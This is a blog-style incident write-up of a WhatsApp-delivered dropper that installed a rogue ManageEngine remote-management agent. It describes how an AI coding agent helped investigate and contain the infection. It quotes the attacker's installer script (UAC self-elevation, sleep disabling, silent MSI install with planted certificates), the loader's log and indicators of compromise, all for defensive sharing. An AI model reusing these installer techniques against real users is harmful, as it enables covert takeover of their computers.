---
title: "I gave Claude full access to a computer someone else was already inside"
---

*Part two of a series on things I have been trying with AI.*

The file came from my father on Monday. Somebody he knows had sent it over WhatsApp, he forwarded it on, and it was called Bank Statement.

I want to be honest about the next bit because it is the part everyone gets wrong about how this happens. I thought it was a little suspicious. Not enough to stop, just enough to notice. It was coming from a known person, through my father, on a day when files arrive constantly, and I opened it anyway. Nothing visibly happened, so I clicked it again.

Then a Windows permission box came up saying Microsoft Endpoint Central and I approved it, because it looked like Windows asking me something about Windows.

A moment later I understood what I had done. I went into Windows Security and turned Defender's real-time protection back on, which had been off, and Defender immediately found the file and deleted it. That felt like the end of it. Bad click, caught it, moved on.

It was not the end of it. Turning Defender back on is the only reason there was any record at all, and it was also about three minutes too late. But I did not know either of those things until Thursday.

## What actually made me look again

Two days later my father checked with the person who had sent it. They had no idea they had sent anything. Their WhatsApp had been sending files to their own contacts without them.

That is the moment the whole thing changed shape. A file you clicked and deleted is a mistake. A file that arrived from a hijacked account belonging to someone you trust, as part of something running through a contact list, is a different problem, and it means whatever was on my machine had three days on it while I thought the matter was closed.

I should say something about my own position here, because it is the reason this article exists. I am a software engineer. I have worked as an SDET, I moved into DevOps, I am not somebody who is frightened of a terminal. I could have worked this out.

But I live on a Mac. Everything I do daily is macOS and Linux, and Windows internals are not where I am fluent any more. Sitting in front of that machine, digging through Event Viewer and service configurations and certificate stores, was going to be slow and unpleasant and I would have been looking things up constantly. The computer itself is old and was crawling. Realistically I was looking at a full day of frustrating work to reach an answer I was not confident I would reach.

So I thought, why not give Claude the whole machine and see what happens.

## Handing over an already-compromised computer

I installed Claude Code on that desktop and gave it an elevated shell. Complete access, full context, and the freedom to run whatever it wanted.

I know how that sounds. Giving an AI administrator rights on any machine is a thing people have opinions about, and giving it administrator rights on a machine that is actively compromised sounds worse.

The reason I was comfortable is the reason the whole situation was already bad. Somebody else had held full control of that computer for three days. Whatever risk I was adding by giving an AI SYSTEM access was rounding error next to the party who already had SYSTEM access and had been using it. The machine was not going to become less trustworthy. The only real question was whether I would find out what had been done to it.

I gave it everything I knew. When the file ran, that Defender had been off, that I had approved a UAC prompt, that I had turned protection back on myself, and roughly when Defender deleted the thing. Those five facts are not in any log and no tool would have recovered them.

Then I mostly watched.

I should admit that somewhere in the middle of it I started enjoying myself, which is a strange thing to say about your own compromised computer. When I was doing DevOps at Hevo I wrote a lot of incident reports, and a good one has a particular rhythm to it. A timeline assembled from evidence rather than from memory. A hard line between what you observed and what you concluded. An honest list at the end of what you still do not know and are not going to find out. I had not written one in years and I did not expect to miss it.

Watching a timeline build itself out of log timestamps, at speed, about a problem that was actually mine, was the most fun I have had with a broken thing in a long time. This article is written the way I used to write those, because that turned out to be the shape the afternoon had anyway.

## What it found, in the order it found it

The first thing it asked for was Defender's full detection history rather than the one alert I had noticed. There were two detections, not one. The one from Thursday morning at 11:32, a file called `GoogleUpdat.bat` sitting in the Startup folder. And mine, from Monday at 16:40.

Then it pulled the list of installed programs sorted by install date, which I would not have thought to do first, and there it was: ManageEngine Endpoint Central, installed Monday at 16:31.

I had never heard of it. Claude had. It is a real product made by Zoho, the kind of thing an IT department uses to run a fleet of computers remotely, push patches, install software, take control of a desktop. It is not malware. It is a legitimate commercial product with a valid signature and thousands of paying customers.

Which meant nobody was attacking my computer. Somebody was administering it.

The agent's config pointed at `27.124.38.42`, port 8027, checking in every two minutes. It also named the console it answered to: hostname `WIN-M063IOSLMVT`, customer name `DC_CUSTOMER`, customer ID `1`.

Claude explained why those three values settled it. That hostname is what Windows generates when nobody types one in, and that customer name and ID are Endpoint Central's factory defaults. Any real IT provider renames the server because their own staff log into it, and brands the customer record because they have more than one customer. Nobody had touched any of it. It was disposable.

I sat with the two minute polling interval for a while. That machine had been checking in with them every two minutes for three days, including right then, while we were reading its config.

## The loader wrote its own log

In `C:\Users\Public\Documents` there were three folders with names like `Cache_B3A_F4B9`, and inside one was a log file the attacker's own software had written.

```
10/08/26 16:29:25 | === V12 Started GROUP=A3 MODE=PROD ===
10/08/26 16:29:26 | workDir=C:\Users\Public\Documents\Cache_B3A_F4B9\
10/08/26 16:29:26 | OS=Windows 10 Pro
10/08/26 16:29:26 | attempt #1 URL#1 / downloading... / order=direct
10/08/26 16:30:00 | OK WinHTTP / download OK
10/08/26 16:30:06 | extracted via synchronous ZipFile
10/08/26 16:30:07 | launching payload
10/08/26 16:30:08 | payload started rc=0
```

That is my click, timestamped. Thirty four seconds to pull down 33 MB, six seconds to unzip, one second to launch.

`V12`. `GROUP=A3`. `MODE=PROD`. Version twelve of something, running in production, with victims sorted into groups. There was a `REMOTEOFFICEID=301` elsewhere in the config. Every file in the package was built on the Saturday, two days before it reached me.

I found that genuinely deflating in a way I had not expected. I had been thinking of this as something that happened to me. It is a product. Somebody maintains it, versions it, ships releases of it. Kaspersky wrote this exact campaign up in June and Microsoft in March, and it runs across eleven countries. Nobody chose my father's supplier or my father or me. We were just standing where it was passing.

## The installer had comments in it

`setup1.vbs` was still on disk. It announces itself as "Microsoft Endpoint Central - Agent Installer, Build 10.0.26100.1882", which is a fabricated banner, because Microsoft has no such product. That banner is why the permission box I approved looked like Windows.

Three things in that script:

```vbscript
' --- Self-elevate with legitimate UAC prompt ---
g_SA.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0

' --- Disable sleep/hibernate (keep machine online) ---
g_Sh.Run "powercfg /change standby-timeout-ac 0", 0, True
g_Sh.Run "powercfg /hibernate off", 0, True

' --- Silent MSI install ---
msiexec.exe /i UEMSAgent.msi TRANSFORMS=UEMSAgent.mst ENABLESILENT=yes
  REBOOT=ReallySuppress SERVER_ROOT_CRT=DMRootCA-Server.crt
  DS_ROOT_CRT=DMRootCA.crt /qn
```

Reading your own mistake described in somebody else's source comments is a strange experience. The first block is the prompt I clicked yes on, and they call it a legitimate UAC prompt in their own code, because it was one. Windows asked exactly the question it is designed to ask.

The second block disables sleep and hibernation, which no installer has any reason to do, and which is there because a sleeping computer cannot be reached.

## Fifty exclusions in one second

Then Claude went into Defender's operational log for event 5007, which is what Windows writes when Defender's configuration changes.

Fifty entries, all stamped `10/08/26 16:40:02`. The same second. Three minutes after Defender deleted the file I had clicked.

That is the moment my own action shows up in their timeline. I turned protection on, Defender ate their dropper, and they responded within three minutes by pushing fifty exclusions to blind it: eight folder patterns, fifteen program names, then the same set again under the SYSTEM profile.

What was in the list is what changed my mood about the whole thing. Some of it was ordinary hiding, invented folders and programs named to look like Windows components. But there was also `del_*.cmd` and `del_*.vbs`, deletion scripts cleared by wildcard, and `ghost_x64.exe`, which is disk imaging software.

Claude told me what that combination usually comes before, and immediately also told me it could not prove it, because nothing was encrypting anything and you cannot read intent off a disk. I appreciated the second half of that sentence more than the first.

The other thing it said about that list has stayed with me. If I had run any antivirus on that machine on Tuesday, it would have come back clean, and it would have been telling the truth. It was clean of everything it was still permitted to look at. Once somebody can edit what your antivirus is allowed to see, the scan stops meaning anything at all.

## The uninstall asked for their code

The obvious move was to just remove the agent. It is a commercial MSI, so `msiexec /x` should do it.

It stopped and asked for a verification code.

Their config had `ENABLE_CAPTCHA: yes`, which is a real Endpoint Central feature designed to stop employees ripping the agent off machines their company manages. The code comes from the console. The console was theirs.

That is when I understood what I was actually dealing with. Every protection in play was working exactly as designed, and all of it was pointing at me. Their remote management product was keeping me from removing their remote management product, using a feature built for legitimate IT departments dealing with uncooperative users. In this arrangement, I was the uncooperative user.

## The service that would not die, and then undid our work

Containment started around 15:20. Claude cut the route to their server at the firewall in both directions first, so that whatever came next could not be watched and reacted to, then worked inward. Fifty exclusions removed and verified empty rather than assumed. The enrolment binding my machine to their console disconnected, which took fourteen scheduled tasks with it. A hidden boot task exported and then disabled, because I asked whether we might want it later and it turned out we did. Two planted root certificates removed and backed up. Both kernel drivers set not to load.

Four of the five agent services stopped and disabled. The fifth refused.

`MEARWService` returned access denied to everything, and we were running elevated. Claude worked out why: it registers itself as a protected anti-malware service, which is the Windows mechanism that stops malware from switching off your antivirus. Windows will not let anything touch a service registered that way, not an administrator, not SYSTEM, not any tool. The refusal comes from the kernel.

Their backdoor was hiding behind the feature Microsoft built to protect people like me.

Then it started fighting back. Claude set `ManageEngine UEMS - Agent` to Disabled and verified it. Within the hour it was back on Automatic. Set it again, verified again, and it went back a second time. Neither of us can tell you whether that was the agent's own self-repair or a person on the other end noticing, and Claude said so rather than guessing.

What I do know is that at 14:45, in the middle of all this, Defender quarantined `GoogleUpdat.bat` for the second time that day. They had noticed their file was gone and sent it again. So for a couple of hours there were two parties administering that computer and undoing each other, and only one side knew it was a contest.

Nothing arrived after 15:20. That silence is the best evidence we have that the containment held.

## The one thing it could not do

Tamper Protection had been switched off from their console on Monday at 16:36 and needed to go back on. Claude could not do it.

Microsoft deliberately blocks Tamper Protection from being changed by script, command line or registry, because a setting malware can flip programmatically is not a protection. It has to be a person clicking the toggle.

So it told me where to click and I clicked it. After all of that, the single most protective action of the day was the one reserved for a human being, and it took four seconds.

Then I rebooted, which is where Claude went blind, because its session lived on the machine that was restarting. It had to be done. Containment that has not survived a restart is a theory. But there was a couple of minutes there where the thing that had been reading everything could see nothing at all, and I was watching a slow old computer boot with no idea what it would come back as.

It came back clean. Tamper Protection on and locally controlled again. Exclusions still zero. No enrolment. Drivers not loading. The hidden boot task reporting that it had never once executed. Zero connections to their address.

`MEARWService` was running again, because protected services always start at boot. It just has nobody to call.

## Where it was wrong

Twice, and I think both are worth putting in.

The credentials were the bad one. Chrome had 67 saved login entries and the first assessment was that essentially all of them were gone, roughly fifty passwords, banks included. I have nine bank accounts, a trading account, GST, income tax and MCA going through that keyboard. That was not a good ten minutes.

Then it stopped counting rows and parsed the database properly. Chrome writes a record when you decline to save a password, so it stops asking. Those sit in the same table and look like entries but hold nothing. Thirty one of the sixty seven were that.

The real number was 21. And the never-saved list was almost everything that mattered: Zerodha, Gmail, AWS, income tax, Kotak, PNB, Bank of Baroda, South Indian Bank, CDSL, BillDesk, SBI ePay, TRACES. Years of clicking "never" on that popup out of mild annoyance, with no security thinking behind it whatsoever, protected me better than anything I have ever paid for.

The second mistake was quieter and could have been worse. Writing up the backup instructions for whoever rebuilds the machine, it identified D: as the primary business data. The live accounting is on E:, in Access front-end and back-end pairs where one file is the program and the other holds the records. Following the original instructions would have produced a working accounting system containing no accounts, across three businesses and several financial years, and nobody would have noticed until they went looking for last year's books. It caught this at 18:40 and put the correction at the top of the page rather than editing it away.

## What I decided

Wipe it. Reinstall Windows from clean media.

The recommendation was Claude's and the reasoning was short: the backdoor cannot be removed from a running system, which we established by trying rather than by theorising, and removal can only deal with what can be listed, and a fifty item exclusion list is proof that things were deliberately made unlistable. On top of that there is no record of what ran between Monday and Thursday, because process auditing was effectively off and PowerShell logging was disabled.

But the decision was mine, and it should have been. Whether to lose a day of production, whether accounts can run off a laptop meanwhile, how much doubt a family business can live with. That is not a technical question and Claude does not carry it if it goes wrong. My father and I also agreed the machine stays in use for accounting only until the rebuild, with no banking and no logins on it.

## Would I do it again

Yes, and I think the interesting part is not that it worked.

Nothing Claude knew was secret. That a factory default customer ID means a disposable console, that Windows protects services registered as anti-malware, that Chrome writes sentinel rows for declined passwords, that an Access `.mde` without its `.mdb` is an empty program. It is all written down somewhere, in vendor docs and forum threads and the heads of people who do this for a living. I could have found most of it. On a Mac, in a domain I work in daily, I would have.

What I could not have done is find all of it, in six hours, on an unfamiliar platform, on a machine so slow that every command was a wait, on a Thursday when I also had a business to run. The realistic alternative was not me doing a worse job. The realistic alternative was calling a local computer person who would have run a scan that came back clean, or paying an incident response firm more than the desktop is worth, or doing nothing. Most people pick the third one and I understand exactly why.

And the limits were as informative as the capability. It got the frightening number wrong first, and the backup instructions wrong first. It could not remove what it found and said so instead of offering four things that would not work. It could not turn Tamper Protection back on. It could not decide anything. When the machine rebooted it could not see.

The division that emerged felt right to me. It knew things I did not. I knew which accounts would actually hurt, I knew the machine did net banking, I had the five facts about Monday that no log contains, and I carried the consequences.

## The thirty seconds that would have saved me all of this

Explorer, then View, then Show, then File name extensions. Turn it on.

Windows hides file extensions by default. That is the entire reason `Bank Statement.vbs` showed up on my screen as `Bank Statement` with a document icon, in a folder full of real documents that arrive over WhatsApp all day. If extensions had been visible I would have seen `.vbs` on a bank statement and none of the rest of this would have happened. I am a software engineer and I would have caught it instantly. I never saw it, because Windows did not show it to me.

The rest of this article is a story. That is the part to go and do, on every machine in your office, today.

The related rule, worth teaching everyone you work with: designs are `.EP`, documents are `.pdf`, `.jpg`, `.xlsx`, `.docx`. Anything ending `.vbs`, `.exe`, `.scr`, `.bat`, `.cmd`, `.js` or `.lnk` is a program, no matter what the filename says or who appears to have sent it. And if software asks you to turn off Defender to install it, that request is the warning.

One more, which is the operational thing I did not know and now will not forget. Changing your password does not sign anybody out. Session cookies were stolen separately and Chrome had its cookie database locked the whole time, so we could not even list what was taken. A stolen cookie logs someone in with no password and no second factor. You have to explicitly revoke sessions everywhere, which is a different button, and almost nobody presses it.

## Closing it out properly

At Hevo an incident was not over when the fire was out. It was over when it was written up and sent, because the report is the only part of the whole exercise that helps anybody who was not in the room.

So we did that here as well. Claude drafted two reports and I sent them. One to CERT-In, the Indian Computer Emergency Response Team, which is the government body you report this kind of thing to and which sends back an incident tracking number. One to Zoho's abuse team with ManageEngine security copied, because it is their product being redistributed as a backdoor and there is a console out there issuing agent configurations under their name to machines that never asked for it.

Neither of those does anything for me. My computer is getting wiped either way. But `27.124.38.42` was not in anybody's published indicator list, which means the next person this happens to has nothing to search for, and that is a fixable problem rather than a fact of life.

We also told Zoho something I suspect they do not hear often, which is that `MEARWService` being unremovable from a running Windows is correct behaviour when the agent is legitimate and a serious problem when it is not. A documented offline removal path would help people in our position a great deal, and right now the only answer available to a small business is to flatten the machine.

## Indicators, if you found this after it happened to you

`27.124.38.42` does not appear in the published indicator sets from Kaspersky or Microsoft for this campaign, which list `202.61.160.201`, `202.61.160.202`, `202.61.160.208`, `202.61.160.137`, `202.61.160.160` and `38.55.151.63`. As far as we can tell this is the first public mention of it.

- Console: `27.124.38.42` port `8027`, hostname `WIN-M063IOSLMVT`, `CUSTOMERNAME=DC_CUSTOMER`, `CUSTOMERID=1`
- Campaign markers: `V12`, `GROUP=A3`, `MODE=PROD`, `REMOTEOFFICEID=301`
- Agent auth key `bfc1882bf4e500395cf398074648377c`, version `11.3.2400.33.W`, two minute polling, `ENABLE_CAPTCHA: yes`
- First stage `Bank Statement.vbs` over WhatsApp, detected `Trojan:Script/Ulthar.A!ml`
- Second stage `GoogleUpdat.bat` in the all users Startup folder, detected `Trojan:Script/Wacatac.H!ml`
- Boot task `\Auto`, SYSTEM, highest privilege, no author, pointing at `d:/2.01/white_notepad_download.exe`
- Staging folders `Cache_B3A_F4B9`, `Cache_D92C_16E1`, `Cache_BAC3_4A1F` under `C:/Users/Public/Documents/`
- Package: `UEMSAgent.msi`, `UEMSAgent.mst`, `DCAgentServerInfo.json`, `DMRootCA.crt`, `DMRootCA-Server.crt`, `setup1.vbs`, `setup.bat`, `RemCom.exe`, `computernames.txt`
- Root CAs planted: `ManageEngineCA` `AA8B93BC0B556AB2C67A1585384777F38E5C6C19`, `ManageEngineCA-DS-CA` `E8359C88757188AEC9C186807C770841919CA71A`
- Service `MEARWService`, protected anti-malware registration. `ManageEngine UEMS - Agent` re-enables itself
- Drivers `DCFAFilter`, `acp_driver`
- Package files all stamped `08/08/2026 20:17:54`

Reported to CERT-In and to Zoho's abuse team. The machine is isolated and waiting to be rebuilt, and I am still working through twenty one password changes and signing out of sessions everywhere, which is going to take most of the week.

---

*This is part two of a series about things I have been trying with AI. Part one is coming.*
